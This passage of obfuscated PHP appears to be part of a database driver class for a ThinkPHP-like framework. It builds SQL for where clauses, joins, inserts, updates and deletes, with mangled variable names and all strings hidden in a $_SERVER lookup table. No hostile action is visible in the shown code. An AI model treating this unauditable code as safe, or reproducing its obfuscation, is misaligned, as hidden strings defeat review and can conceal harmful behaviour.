$òè°ßΩ≤ = $òùü≤€; } $òùü≤€ = $òè°ßΩ≤ !== -1 ? $òè°ßΩ≤ : $òùü≤€; $ùêú«Œ◊ = array($Ö¶‘•Ñõ[864] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[864]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[864]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[864]][0], $Ö¶‘•Ñõ[865] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[865]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[865]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[865]][0], $Ö¶‘•Ñõ[862] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[862]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[862]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[862]][0], $Ö¶‘•Ñõ[863] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[863]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[863]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[863]][0], $Ö¶‘•Ñõ[21] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[21]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[21]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[21]][0], $Ö¶‘•Ñõ[892] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[892]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[892]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[892]][0], $Ö¶‘•Ñõ[17] => isset($¬›±ÀÑÏ[$Ö¶‘•Ñõ[17]][$òùü≤€]) ? $¬›±ÀÑÏ[$Ö¶‘•Ñõ[17]][$òùü≤€] : $¬›±ÀÑÏ[$Ö¶‘•Ñõ[17]][0]); return $this->connect($ùêú«Œ◊, $òùü≤€); } public function parseDSN($Ÿ‰·ŸÿÎ) { $·ÖÔûäÑ =& $_SERVER[ëæªã÷]; if (empty($Ÿ‰·ŸÿÎ)) { return !1; } $˛ÓÉ€≤Û = parse_url($Ÿ‰·ŸÿÎ); if ($˛ÓÉ€≤Û[$·ÖÔûäÑ[183]]) { $÷≤˚Å⁄ç = array($·ÖÔûäÑ[937] => $˛ÓÉ€≤Û[$·ÖÔûäÑ[183]], $·ÖÔûäÑ[864] => isset($˛ÓÉ€≤Û[$·ÖÔûäÑ[594]]) ? $˛ÓÉ€≤Û[$·ÖÔûäÑ[594]] : $·ÖÔûäÑ[12], $·ÖÔûäÑ[865] => isset($˛ÓÉ€≤Û[$·ÖÔûäÑ[961]]) ? $˛ÓÉ€≤Û[$·ÖÔûäÑ[961]] : $·ÖÔûäÑ[12], $·ÖÔûäÑ[862] => isset($˛ÓÉ€≤Û[$·ÖÔûäÑ[184]]) ? $˛ÓÉ€≤Û[$·ÖÔûäÑ[184]] : $·ÖÔûäÑ[12], $·ÖÔûäÑ[863] => isset($˛ÓÉ€≤Û[$·ÖÔûäÑ[185]]) ? $˛ÓÉ€≤Û[$·ÖÔûäÑ[185]] : $·ÖÔûäÑ[12], $·ÖÔûäÑ[21] => isset($˛ÓÉ€≤Û[$·ÖÔûäÑ[88]]) ? substr($˛ÓÉ€≤Û[$·ÖÔûäÑ[88]], 1) : $·ÖÔûäÑ[12]); } else { preg_match($·ÖÔûäÑ[962], trim($Ÿ‰·ŸÿÎ), $õû”¥…ª); $÷≤˚Å⁄ç = array($·ÖÔûäÑ[937] => $õû”¥…ª[1], $·ÖÔûäÑ[864] => $õû”¥…ª[2], $·ÖÔûäÑ[865] => $õû”¥…ª[3], $·ÖÔûäÑ[862] => $õû”¥…ª[4], $·ÖÔûäÑ[863] => $õû”¥…ª[5], $·ÖÔûäÑ[21] => $õû”¥…ª[6]); } $÷≤˚Å⁄ç[$·ÖÔûäÑ[892]] = $·ÖÔûäÑ[12]; return $÷≤˚Å⁄ç; } protected function debug() { $∂à–∆«€ =& $_SERVER[ëæªã÷]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $∂à–∆«€[963]; if (think_config($∂à–∆«€[964])) { think_status($∂à–∆«€[965]); think_trace($this->queryStr . $∂à–∆«€[966] . think_status($∂à–∆«€[24], $∂à–∆«€[965], 6) . $∂à–∆«€[967], $∂à–∆«€[12], $∂à–∆«€[968]); } } protected function parseLock($∫ÇîüåÍ = false) { $ñ††ƒ =& $_SERVER[ëæªã÷]; if (!$∫ÇîüåÍ) { return $ñ††ƒ[12]; } if ($ñ††ƒ[894] == $this->dbType) { return $ñ††ƒ[969]; } return $ñ††ƒ[970]; } protected function parseSet($¬–æÂÙã) { $«Œõàöª =& $_SERVER[ëæªã÷]; foreach ($¬–æÂÙã as $„âÀ®ö≥ => $˝‡»ˆ≥°) { if (is_array($˝‡»ˆ≥°) && $«Œõàöª[301] == $˝‡»ˆ≥°[0]) { $Óï∑⁄Ô⁄[] = $this->parseKey($„âÀ®ö≥) . $«Œõàöª[860] . $˝‡»ˆ≥°[1]; } elseif (is_scalar($˝‡»ˆ≥°) || is_null($˝‡»ˆ≥°)) { $Óï∑⁄Ô⁄[] = $this->parseKey($„âÀ®ö≥) . $«Œõàöª[860] . $this->parseValue($˝‡»ˆ≥°); } } return $«Œõàöª[971] . implode($«Œõàöª[50], $Óï∑⁄Ô⁄); } protected function bindParam($…ÓÎ¡ﬂ√, $›ÜÓÚÛ∆) { $this->bind[$_SERVER[ëæªã÷][4] . $…ÓÎ¡ﬂ√] = $›ÜÓÚÛ∆; } protected function parseBind($Æ®Áœ¶á) { $Æ®Áœ¶á = array_merge($this->bind, $Æ®Áœ¶á); $this->bind = array(); return $Æ®Áœ¶á; } function parseKey(&$¥ÃŸ§íÔ, $„∫√˜öŸ = true) { if ($„∫√˜öŸ) { $¥ÃŸ§íÔ = $this->parseKeyCheck($¥ÃŸ§íÔ); } return $¥ÃŸ§íÔ; } function parseKeyCheck($ù…ÎÆß¡) { $ÂÒåÁÖÑ =& $_SERVER[ëæªã÷]; $ù…ÎÆß¡ = trim($ù…ÎÆß¡); if (!preg_match($ÂÒåÁÖÑ[972], $ù…ÎÆß¡)) { think_exception($ÂÒåÁÖÑ[973] . $ù…ÎÆß¡); } return $ù…ÎÆß¡; } protected function parseValue($ÃåıŸó•) { $Êî«‹∂® =& $_SERVER[ëæªã÷]; if (is_string($ÃåıŸó•)) { $ÃåıŸó• = $Êî«‹∂®[933] . $this->escapeString($ÃåıŸó•) . $Êî«‹∂®[933]; } elseif (isset($ÃåıŸó•[0]) && is_string($ÃåıŸó•[0]) && strtolower($ÃåıŸó•[0]) == $Êî«‹∂®[301]) { $ÃåıŸó• = $this->escapeString($ÃåıŸó•[1]); } elseif (is_array($ÃåıŸó•)) { $ÃåıŸó• = array_map(array($this, $Êî«‹∂®[934]), $ÃåıŸó•); } elseif (is_bool($ÃåıŸó•)) { $ÃåıŸó• = $ÃåıŸó• ? $Êî«‹∂®[99] : $Êî«‹∂®[200]; } elseif (is_null($ÃåıŸó•)) { $ÃåıŸó• = $Êî«‹∂®[114]; } return $ÃåıŸó•; } protected function parseField($üÔ˘á™Ç) { $ﬂ„˘÷˝ﬁ =& $_SERVER[ëæªã÷]; if (is_string($üÔ˘á™Ç) && strpos($üÔ˘á™Ç, $ﬂ„˘÷˝ﬁ[50])) { $üÔ˘á™Ç = explode($ﬂ„˘÷˝ﬁ[50], $üÔ˘á™Ç); } if (is_array($üÔ˘á™Ç)) { $¥’˘¸ô = array(); foreach ($üÔ˘á™Ç as $Ç≥Ôƒ©◊ => $¬˛∂Úµá) { if (!is_numeric($Ç≥Ôƒ©◊)) { $¥’˘¸ô[] = $this->parseKey($Ç≥Ôƒ©◊, !1) . $ﬂ„˘÷˝ﬁ[974] . $this->parseKey($¬˛∂Úµá); } else { $¥’˘¸ô[] = $this->parseKey($¬˛∂Úµá); } } $ëúƒÃ¯ = implode($ﬂ„˘÷˝ﬁ[50], $¥’˘¸ô); } elseif (is_string($üÔ˘á™Ç) && !empty($üÔ˘á™Ç)) { $ëúƒÃ¯ = $üÔ˘á™Ç; } else { $ëúƒÃ¯ = $ﬂ„˘÷˝ﬁ[191]; } return $ëúƒÃ¯; } protected function parseTable($¢ßÓ™˝È) { $®˛ŸÂÑ¢ =& $_SERVER[ëæªã÷]; if (is_array($¢ßÓ™˝È)) { $ÇÚãìÜÒ = array(); foreach ($¢ßÓ™˝È as $å®ôø«∆ => $Öµ©Ó˛⁄) { if (!is_numeric($å®ôø«∆)) { $ÇÚãìÜÒ[] = $this->parseKey($å®ôø«∆) . $®˛ŸÂÑ¢[53] . $this->parseKey($Öµ©Ó˛⁄); } else { $ÇÚãìÜÒ[] = $this->parseKey($å®ôø«∆); } } $¢ßÓ™˝È = $ÇÚãìÜÒ; } elseif (is_string($¢ßÓ™˝È)) { if (strstr($¢ßÓ™˝È, $®˛ŸÂÑ¢[53])) { return $¢ßÓ™˝È; } $¢ßÓ™˝È = explode($®˛ŸÂÑ¢[50], $¢ßÓ™˝È); array_walk($¢ßÓ™˝È, array($this, $®˛ŸÂÑ¢[882])); } return $®˛ŸÂÑ¢[876] . trim(implode($®˛ŸÂÑ¢[975], $¢ßÓ™˝È), $®˛ŸÂÑ¢[389]) . $®˛ŸÂÑ¢[876]; } protected function parseWhere($’Ê€çÂ≈) { $∂≠Â¡É¸ =& $_SERVER[ëæªã÷]; $õÍØß≠Ô = $∂≠Â¡É¸[12]; if (is_string($’Ê€çÂ≈)) { $õÍØß≠Ô = $’Ê€çÂ≈; } else { $≤ÅÚâºÉ = isset($’Ê€çÂ≈[$∂≠Â¡É¸[976]]) ? strtoupper($’Ê€çÂ≈[$∂≠Â¡É¸[976]]) : $∂≠Â¡É¸[12]; if (in_array($≤ÅÚâºÉ, array($∂≠Â¡É¸[977], $∂≠Â¡É¸[978], $∂≠Â¡É¸[979]))) { $≤ÅÚâºÉ = $∂≠Â¡É¸[53] . $≤ÅÚâºÉ . $∂≠Â¡É¸[53]; unset($’Ê€çÂ≈[$∂≠Â¡É¸[976]]); } else { $≤ÅÚâºÉ = $∂≠Â¡É¸[980]; } foreach ($’Ê€çÂ≈ as $øÆêÓò◊ => $øﬂ™ªØ˙) { $õÍØß≠Ô .= $∂≠Â¡É¸[281]; if (is_numeric($øÆêÓò◊)) { $øÆêÓò◊ = $∂≠Â¡É¸[981]; } if (0 === strpos($øÆêÓò◊, $∂≠Â¡É¸[11])) { $õÍØß≠Ô .= $this->parseThinkWhere($øÆêÓò◊, $øﬂ™ªØ˙); } else { if (!preg_match($∂≠Â¡É¸[982], trim($øÆêÓò◊))) { think_exception(think_lang($∂≠Â¡É¸[983]) . $∂≠Â¡É¸[4] . $øÆêÓò◊); } $®‘≈á˝ä = is_array($øﬂ™ªØ˙) && isset($øﬂ™ªØ˙[$∂≠Â¡É¸[984]]); $øÆêÓò◊ = trim($øÆêÓò◊); if (strpos($øÆêÓò◊, $∂≠Â¡É¸[287])) { $çÆÄ»—ô = explode($∂≠Â¡É¸[287], $øÆêÓò◊); $õ◊¨üı• = array(); foreach ($çÆÄ»—ô as $√‹Å éØ => $ã’÷›ÅÊ) { $‰£ùÔÊ› = $®‘≈á˝ä ? $øﬂ™ªØ˙[$√‹Å éØ] : $øﬂ™ªØ˙; $õ◊¨üı•[] = $∂≠Â¡É¸[264] . $this->parseWhereItem($this->parseKey($ã’÷›ÅÊ), $‰£ùÔÊ›) . $∂≠Â¡É¸[881]; } $õÍØß≠Ô .= implode($∂≠Â¡É¸[985], $õ◊¨üı•); } elseif (strpos($øÆêÓò◊, $∂≠Â¡É¸[288])) { $çÆÄ»—ô = explode($∂≠Â¡É¸[288], $øÆêÓò◊); $õ◊¨üı• = array(); foreach ($çÆÄ»—ô as $√‹Å éØ => $ã’÷›ÅÊ) { $‰£ùÔÊ› = $®‘≈á˝ä ? $øﬂ™ªØ˙[$√‹Å éØ] : $øﬂ™ªØ˙; $õ◊¨üı•[] = $∂≠Â¡É¸[264] . $this->parseWhereItem($this->parseKey($ã’÷›ÅÊ), $‰£ùÔÊ›) . $∂≠Â¡É¸[881]; } $õÍØß≠Ô .= implode($∂≠Â¡É¸[980], $õ◊¨üı•); } else { $õÍØß≠Ô .= $this->parseWhereItem($this->parseKey($øÆêÓò◊), $øﬂ™ªØ˙); } } $õÍØß≠Ô .= $∂≠Â¡É¸[282] . $≤ÅÚâºÉ; } $õÍØß≠Ô = substr($õÍØß≠Ô, 0, -strlen($≤ÅÚâºÉ)); } return empty($õÍØß≠Ô) ? $∂≠Â¡É¸[12] : $∂≠Â¡É¸[986] . $õÍØß≠Ô; } protected function parseWhereItem($˜ı∏ª˘‚, $òíçÓ∞ò) { $´ŒªÛ≤´ =& $_SERVER[ëæªã÷]; $ØëÒ±Û¿ = $´ŒªÛ≤´[12]; if (is_array($òíçÓ∞ò)) { if (is_string($òíçÓ∞ò[0])) { $É¡ñﬁÁè = strtolower($òíçÓ∞ò[0]); if (in_array($òíçÓ∞ò[0], array($´ŒªÛ≤´[860], $´ŒªÛ≤´[987], $´ŒªÛ≤´[988], $´ŒªÛ≤´[989], $´ŒªÛ≤´[990], $´ŒªÛ≤´[991]))) { $ØëÒ±Û¿ .= $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $òíçÓ∞ò[0] . $´ŒªÛ≤´[53] . $this->parseValue($òíçÓ∞ò[1]); } elseif (preg_match($´ŒªÛ≤´[992], $òíçÓ∞ò[0])) { $ØëÒ±Û¿ .= $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $this->exp[$É¡ñﬁÁè] . $´ŒªÛ≤´[53] . $this->parseValue($òíçÓ∞ò[1]); } elseif (preg_match($´ŒªÛ≤´[993], $òíçÓ∞ò[0])) { if (is_array($òíçÓ∞ò[1])) { $Ù·ûˆœ† = isset($òíçÓ∞ò[2]) ? strtoupper($òíçÓ∞ò[2]) : $´ŒªÛ≤´[978]; if (in_array($Ù·ûˆœ†, array($´ŒªÛ≤´[977], $´ŒªÛ≤´[978], $´ŒªÛ≤´[979]))) { $íòΩÎ…’ = array(); foreach ($òíçÓ∞ò[1] as $◊ÔÈÓÍ≥) { $íòΩÎ…’[] = $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $this->exp[$É¡ñﬁÁè] . $´ŒªÛ≤´[53] . $this->parseValue($◊ÔÈÓÍ≥); } $ØëÒ±Û¿ .= $´ŒªÛ≤´[264] . implode($´ŒªÛ≤´[53] . $Ù·ûˆœ† . $´ŒªÛ≤´[53], $íòΩÎ…’) . $´ŒªÛ≤´[881]; } } else { $ØëÒ±Û¿ .= $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $this->exp[$É¡ñﬁÁè] . $´ŒªÛ≤´[53] . $this->parseValue($òíçÓ∞ò[1]); } } elseif ($´ŒªÛ≤´[301] == $É¡ñﬁÁè) { $ØëÒ±Û¿ .= $´ŒªÛ≤´[879] . $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $òíçÓ∞ò[1] . $´ŒªÛ≤´[994]; } elseif (preg_match($´ŒªÛ≤´[995], $òíçÓ∞ò[0])) { $ØëÒ±Û¿ .= $òíçÓ∞ò[0]; } elseif (preg_match($´ŒªÛ≤´[996], $òíçÓ∞ò[0])) { if (isset($òíçÓ∞ò[2]) && $´ŒªÛ≤´[301] == $òíçÓ∞ò[2]) { $ØëÒ±Û¿ .= $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $this->exp[$É¡ñﬁÁè] . $´ŒªÛ≤´[53] . $òíçÓ∞ò[1]; } else { if (is_string($òíçÓ∞ò[1])) { $òíçÓ∞ò[1] = explode($´ŒªÛ≤´[50], $òíçÓ∞ò[1]); } $∏íÀÑÛ± = implode($´ŒªÛ≤´[50], $this->parseValue($òíçÓ∞ò[1])); $ØëÒ±Û¿ .= $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $this->exp[$É¡ñﬁÁè] . $´ŒªÛ≤´[879] . $∏íÀÑÛ± . $´ŒªÛ≤´[881]; } } elseif (preg_match($´ŒªÛ≤´[997], $òíçÓ∞ò[0])) { $Õ™œºª™ = is_string($òíçÓ∞ò[1]) ? explode($´ŒªÛ≤´[50], $òíçÓ∞ò[1]) : $òíçÓ∞ò[1]; $ØëÒ±Û¿ .= $´ŒªÛ≤´[879] . $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $this->exp[$É¡ñﬁÁè] . $´ŒªÛ≤´[53] . $this->parseValue($Õ™œºª™[0]) . $´ŒªÛ≤´[980] . $this->parseValue($Õ™œºª™[1]) . $´ŒªÛ≤´[282]; } else { think_exception(think_lang($´ŒªÛ≤´[983]) . $´ŒªÛ≤´[4] . $òíçÓ∞ò[0]); } } else { $˚√’´€® = count($òíçÓ∞ò); $Âó’á®§ = $´ŒªÛ≤´[12]; if (is_string($òíçÓ∞ò[$˚√’´€® - 1])) { $Âó’á®§ = isset($òíçÓ∞ò[$˚√’´€® - 1]) ? strtoupper($òíçÓ∞ò[$˚√’´€® - 1]) : $´ŒªÛ≤´[12]; if (in_array($Âó’á®§, array($´ŒªÛ≤´[977], $´ŒªÛ≤´[978], $´ŒªÛ≤´[979]))) { $˚√’´€® = $˚√’´€® - 1; } } else { $Âó’á®§ = $´ŒªÛ≤´[977]; } for ($◊ìœ—Ôæ = 0; $◊ìœ—Ôæ < $˚√’´€®; $◊ìœ—Ôæ++) { $Õ™œºª™ = is_array($òíçÓ∞ò[$◊ìœ—Ôæ]) ? $òíçÓ∞ò[$◊ìœ—Ôæ][1] : $òíçÓ∞ò[$◊ìœ—Ôæ]; if ($´ŒªÛ≤´[301] == strtolower($òíçÓ∞ò[$◊ìœ—Ôæ][0])) { $ØëÒ±Û¿ .= $´ŒªÛ≤´[264] . $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $Õ™œºª™ . $´ŒªÛ≤´[994] . $Âó’á®§ . $´ŒªÛ≤´[53]; } else { $•≈Ö“ﬂÁ = is_array($òíçÓ∞ò[$◊ìœ—Ôæ]) ? $this->exp[strtolower($òíçÓ∞ò[$◊ìœ—Ôæ][0])] : $´ŒªÛ≤´[860]; if (!$•≈Ö“ﬂÁ && is_array($òíçÓ∞ò[$◊ìœ—Ôæ]) && in_array($òíçÓ∞ò[$◊ìœ—Ôæ][0], array($´ŒªÛ≤´[860], $´ŒªÛ≤´[987], $´ŒªÛ≤´[988], $´ŒªÛ≤´[989], $´ŒªÛ≤´[990], $´ŒªÛ≤´[991]))) { $•≈Ö“ﬂÁ = $òíçÓ∞ò[$◊ìœ—Ôæ][0]; } $ØëÒ±Û¿ .= $´ŒªÛ≤´[264] . $˜ı∏ª˘‚ . $´ŒªÛ≤´[53] . $•≈Ö“ﬂÁ . $´ŒªÛ≤´[53] . $this->parseValue($Õ™œºª™) . $´ŒªÛ≤´[994] . $Âó’á®§ . $´ŒªÛ≤´[53]; } } $ØëÒ±Û¿ = substr($ØëÒ±Û¿, 0, -4); } } else { $ØëÒ±Û¿ .= $˜ı∏ª˘‚ . $´ŒªÛ≤´[998] . $this->parseValue($òíçÓ∞ò); } return $ØëÒ±Û¿; } protected function parseThinkWhere($≥˚’÷öŸ, $†õËºú∫) { $°˘Ç‰∆ú =& $_SERVER[ëæªã÷]; $Å´ÕøÇ† = $°˘Ç‰∆ú[12]; switch ($≥˚’÷öŸ) { case $°˘Ç‰∆ú[356]: $Å´ÕøÇ† = $†õËºú∫; break; case $°˘Ç‰∆ú[981]: $Å´ÕøÇ† = is_string($†õËºú∫) ? $†õËºú∫ : substr($this->parseWhere($†õËºú∫), 6); break; case $°˘Ç‰∆ú[999]: parse_str($†õËºú∫, $˜‘ÙÛ¶ﬁ); if (isset($˜‘ÙÛ¶ﬁ[$°˘Ç‰∆ú[976]])) { $õÈÅ≠˝ÿ = $°˘Ç‰∆ú[53] . strtoupper($˜‘ÙÛ¶ﬁ[$°˘Ç‰∆ú[976]]) . $°˘Ç‰∆ú[53]; unset($˜‘ÙÛ¶ﬁ[$°˘Ç‰∆ú[976]]); } else { $õÈÅ≠˝ÿ = $°˘Ç‰∆ú[980]; } $¬∫‡ó◊ó = array(); foreach ($˜‘ÙÛ¶ﬁ as $ëõÖ·‰ç => $Œ®ÿÚ√±) { $¬∫‡ó◊ó[] = $this->parseKey($ëõÖ·‰ç) . $°˘Ç‰∆ú[998] . $this->parseValue($Œ®ÿÚ√±); } $Å´ÕøÇ† = implode($õÈÅ≠˝ÿ, $¬∫‡ó◊ó); break; } return $Å´ÕøÇ†; } protected function parseLimit($©«ÿââõ) { $òõ¯üÔœ =& $_SERVER[ëæªã÷]; return !empty($©«ÿââõ) ? $òõ¯üÔœ[51] . $©«ÿââõ . $òõ¯üÔœ[53] : $òõ¯üÔœ[12]; } protected function parseJoin($Öà∆ï∆˚) { $µÜçä°Ÿ =& $_SERVER[ëæªã÷]; $‚È≤¥óë = $µÜçä°Ÿ[12]; if (!empty($Öà∆ï∆˚)) { if (is_array($Öà∆ï∆˚)) { foreach ($Öà∆ï∆˚ as $•õ÷›ù˙ => $¿¥•ö–Ç) { if (!1 !== stripos($¿¥•ö–Ç, $µÜçä°Ÿ[1000])) { $‚È≤¥óë .= $µÜçä°Ÿ[53] . $¿¥•ö–Ç; } else { $‚È≤¥óë .= $µÜçä°Ÿ[1001] . $¿¥•ö–Ç; } } } else { $‚È≤¥óë .= $µÜçä°Ÿ[1001] . $Öà∆ï∆˚; } } $‚È≤¥óë = preg_replace($µÜçä°Ÿ[1002], think_config($µÜçä°Ÿ[906]) . $µÜçä°Ÿ[1003], $‚È≤¥óë); return $‚È≤¥óë; } protected function parseOrder($‘¨÷¥îÌ) { $Ÿ‡ŸÛ¿ú =& $_SERVER[ëæªã÷]; if (is_array($‘¨÷¥îÌ)) { $÷©Üùã· = array(); foreach ($‘¨÷¥îÌ as $ÍËŒ∆±Û => $êËÉã¬ı) { if (is_numeric($ÍËŒ∆±Û)) { $÷©Üùã·[] = $this->parseKey($êËÉã¬ı); } else { $êËÉã¬ı = in_array(strtoupper(trim($êËÉã¬ı)), array($Ÿ‡ŸÛ¿ú[1004], $Ÿ‡ŸÛ¿ú[1005])) ? $Ÿ‡ŸÛ¿ú[53] . $êËÉã¬ı : $Ÿ‡ŸÛ¿ú[12]; if (preg_match($Ÿ‡ŸÛ¿ú[1006], $ÍËŒ∆±Û)) { $÷©Üùã·[] = $this->parseKey($ÍËŒ∆±Û) . $êËÉã¬ı; } else { think_exception($Ÿ‡ŸÛ¿ú[1007] . $ÍËŒ∆±Û); } } } $‘¨÷¥îÌ = implode($Ÿ‡ŸÛ¿ú[50], $÷©Üùã·); } return !empty($‘¨÷¥îÌ) ? $Ÿ‡ŸÛ¿ú[1008] . $‘¨÷¥îÌ : $Ÿ‡ŸÛ¿ú[12]; } protected function parseGroup($åÔ®ﬁô§) { $ÖÏåÇ≥Ò =& $_SERVER[ëæªã÷]; return !empty($åÔ®ﬁô§) ? $ÖÏåÇ≥Ò[1009] . $åÔ®ﬁô§ : $ÖÏåÇ≥Ò[12]; } protected function parseHaving($ò•‘¿≥») { $†¡…ÊÜ∆ =& $_SERVER[ëæªã÷]; return !empty($ò•‘¿≥») ? $†¡…ÊÜ∆[1010] . $ò•‘¿≥» : $†¡…ÊÜ∆[12]; } protected function parseComment($•Á·∞∏¡) { $ÇΩÕ≠Ïı =& $_SERVER[ëæªã÷]; return !empty($•Á·∞∏¡) ? $ÇΩÕ≠Ïı[1011] . $•Á·∞∏¡ . $ÇΩÕ≠Ïı[1012] : $ÇΩÕ≠Ïı[12]; } protected function parseDistinct($Ï¨ËﬂÀÿ) { $„˙Á«√¨ =& $_SERVER[ëæªã÷]; return !empty($Ï¨ËﬂÀÿ) ? $„˙Á«√¨[1013] : $„˙Á«√¨[12]; } protected function parseUnion($’Ÿ˙Ëß ) { $ÁÃë⁄ßë =& $_SERVER[ëæªã÷]; if (empty($’Ÿ˙Ëß )) { return $ÁÃë⁄ßë[12]; } if (isset($’Ÿ˙Ëß [$ÁÃë⁄ßë[352]])) { $éÌº¨ÖÕ = $ÁÃë⁄ßë[1014]; unset($’Ÿ˙Ëß [$ÁÃë⁄ßë[352]]); } else { $éÌº¨ÖÕ = $ÁÃë⁄ßë[1015]; } foreach ($’Ÿ˙Ëß  as $ß±‡¶Ã®) { $”äºË†¶[] = $éÌº¨ÖÕ . (is_array($ß±‡¶Ã®) ? $this->buildSelectSql($ß±‡¶Ã®) : $ß±‡¶Ã®); } return implode($ÁÃë⁄ßë[53], $”äºË†¶); } public function insert($É˜Ì∑Ê‘, $ªåúÈ•Ò = array(), $ÚíÊ◊ˆá = false) { $ÓÑ¿≈∆® =& $_SERVER[ëæªã÷]; $ß´≤Âç√ = $ÛûïâÈÃ = array(); $this->model = $ªåúÈ•Ò[$ÓÑ¿≈∆®[285]]; foreach ($É˜Ì∑Ê‘ as $·——≈“Â => $∂‚í˝€) { if (is_array($∂‚í˝€) && $ÓÑ¿≈∆®[301] == $∂‚í˝€[0]) { $ÛûïâÈÃ[] = $this->parseKey($·——≈“Â); $ß´≤Âç√[] = $∂‚í˝€[1]; } elseif (is_scalar($∂‚í˝€) || is_null($∂‚í˝€)) { $ÛûïâÈÃ[] = $this->parseKey($·——≈“Â); $ß´≤Âç√[] = $this->parseValue($∂‚í˝€); } } $ù¯πó›ù = ($ÚíÊ◊ˆá ? $ÓÑ¿≈∆®[883] : $ÓÑ¿≈∆®[884]) . $ÓÑ¿≈∆®[885] . $this->parseTable($ªåúÈ•Ò[$ÓÑ¿≈∆®[283]]) . $ÓÑ¿≈∆®[879] . implode($ÓÑ¿≈∆®[50], $ÛûïâÈÃ) . $ÓÑ¿≈∆®[880] . implode($ÓÑ¿≈∆®[50], $ß´≤Âç√) . $ÓÑ¿≈∆®[881]; $ù¯πó›ù .= $this->parseLock(isset($ªåúÈ•Ò[$ÓÑ¿≈∆®[823]]) ? $ªåúÈ•Ò[$ÓÑ¿≈∆®[823]] : !1); $ù¯πó›ù .= $this->parseComment(!empty($ªåúÈ•Ò[$ÓÑ¿≈∆®[358]]) ? $ªåúÈ•Ò[$ÓÑ¿≈∆®[358]] : $ÓÑ¿≈∆®[12]); return $this->execute($ù¯πó›ù, $this->parseBind(!empty($ªåúÈ•Ò[$ÓÑ¿≈∆®[289]]) ? $ªåúÈ•Ò[$ÓÑ¿≈∆®[289]] : array())); } public function selectInsert($ó™‘’û≠, $åü∑ñ›ê, $–—‹Ω∞Ë = array()) { $·◊´‘˜ü =& $_SERVER[ëæªã÷]; $this->model = $–—‹Ω∞Ë[$·◊´‘˜ü[285]]; if (is_string($ó™‘’û≠)) { $ó™‘’û≠ = explode($·◊´‘˜ü[50], $ó™‘’û≠); } array_walk($ó™‘’û≠, array($this, $·◊´‘˜ü[882])); $¢˝«áÌë = $·◊´‘˜ü[1016] . $this->parseTable($åü∑ñ›ê) . $·◊´‘˜ü[879] . implode($·◊´‘˜ü[50], $ó™‘’û≠) . $·◊´‘˜ü[994]; $¢˝«áÌë .= $this->buildSelectSql($–—‹Ω∞Ë); return $this->execute($¢˝«áÌë, $this->parseBind(!empty($–—‹Ω∞Ë[$·◊´‘˜ü[289]]) ? $–—‹Ω∞Ë[$·◊´‘˜ü[289]] : array())); } public function update($…ò≤ü¿“, $˝øñ“óÒ) { $„ãÎåãµ =& $_SERVER[ëæªã÷]; $this->model = $˝øñ“óÒ[$„ãÎåãµ[285]]; $Â¸¸ˆıÙ = $„ãÎåãµ[1017] . $this->parseTable($˝øñ“óÒ[$„ãÎåãµ[283]]) . $this->parseSet($…ò≤ü¿“) . $this->parseWhere(!empty($˝øñ“óÒ[$„ãÎåãµ[279]]) ? $˝øñ“óÒ[$„ãÎåãµ[279]] : $„ãÎåãµ[12]) . $this->parseOrder(!empty($˝øñ“óÒ[$„ãÎåãµ[369]]) ? $˝øñ“óÒ[$„ãÎåãµ[369]] : $„ãÎåãµ[12]) . $this->parseLimit(!empty($˝øñ“óÒ[$„ãÎåãµ[296]]) ? $˝øñ“óÒ[$„ãÎåãµ[296]] : $„ãÎåãµ[12]) . $this->parseLock(isset($˝øñ“óÒ[$„ãÎåãµ[823]]) ? $˝øñ“óÒ[$„ãÎåãµ[823]] : !1) . $this->parseComment(!empty($˝øñ“óÒ[$„ãÎåãµ[358]]) ? $˝øñ“óÒ[$„ãÎåãµ[358]] : $„ãÎåãµ[12]); return $this->execute($Â¸¸ˆıÙ, $this->parseBind(!empty($˝øñ“óÒ[$„ãÎåãµ[289]]) ? $˝øñ“óÒ[$„ãÎåãµ[289]] : array())); } public function delete($œˆƒŒøê = array()) { $åÁì∂§‹ =& $_SERVER[ëæªã÷]; $this->model = $œˆƒŒøê[$åÁì∂§‹[285]]; $Û¿∆†ÀŒ = $åÁì∂§‹[1018] . $this->parseTable($œˆƒŒøê[$åÁì∂§‹[283]]) . $this->parseWhere(!empty($œˆƒŒøê[$åÁì∂§‹[279]]) ? $œˆƒŒøê[$åÁì∂§‹[279]] : $åÁì∂§‹[12]) . $this->parseOrder(!empty($œˆƒŒøê[$åÁì∂§‹[369]]) ? $œˆƒŒøê[$åÁì∂§‹[369]] : $åÁì∂§‹[12]) . $this->parseLimit(!empty($œˆƒŒøê[$åÁì∂§‹[296]]) ? $œˆƒŒøê[$åÁì∂§‹[296]] : $åÁì∂§‹[12]) . $this->parseLock(isset($œˆƒŒøê[$åÁì∂§‹[823]]) ? $œˆƒŒøê[$åÁì∂§‹[823]] : !1) . 